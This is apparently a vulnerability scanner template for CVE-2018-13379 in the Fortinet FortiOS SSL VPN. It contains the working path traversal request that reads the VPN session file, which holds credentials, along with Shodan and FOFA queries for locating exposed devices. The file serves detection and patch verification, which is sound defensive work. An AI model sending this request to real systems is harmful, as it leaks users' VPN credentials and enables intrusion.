http:
- matchers:
  - part: body
    regex:
    - ^var fgt_lang =
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
id: CVE-2018-13379
info:
  author: organiccrap
  classification:
    cpe: cpe:2.3:o:fortinet:fortios:*:*:*:*:*:*:*:*
    cve-id: CVE-2018-13379
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
    epss-percentile: 0.99997
    epss-score: 0.94475
  description: Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7 and 5.4.6 to 5.4.12
    and FortiProxy 2.0.0, 1.2.0 to 1.2.8, 1.1.0 to 1.1.6, 1.0.0 to 1.0.7 under SSL
    VPN web portal allows an unauthenticated attacker to download system files via
    special crafted HTTP resource requests due to improper limitation of a pathname
    to a restricted directory (path traversal).
  impact: 'An attacker can obtain sensitive information such as usernames and passwords.

    '
  metadata:
    fofa-query:
    - body="/remote/login" "xxxxxxxx"
    - icon_hash=945408572
    max-request: 1
    product: fortios
    shodan-query:
    - http.html:"/remote/login" "xxxxxxxx"
    - http.favicon.hash:945408572
    - cpe:"cpe:2.3:o:fortinet:fortios"
    - port:10443 http.favicon.hash:945408572
    vendor: fortinet
    verified: true
  name: Fortinet FortiOS - Credentials Disclosure
  reference:
  - https://fortiguard.com/advisory/FG-IR-18-384
  - https://www.fortiguard.com/psirt/FG-IR-20-233
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379
  remediation: 'Apply the necessary patches or updates provided by Fortinet to fix
    the vulnerability.

    '
  severity: critical
  tags: cve2018,cve,fortios,lfi,kev,fortinet,vkev,vuln
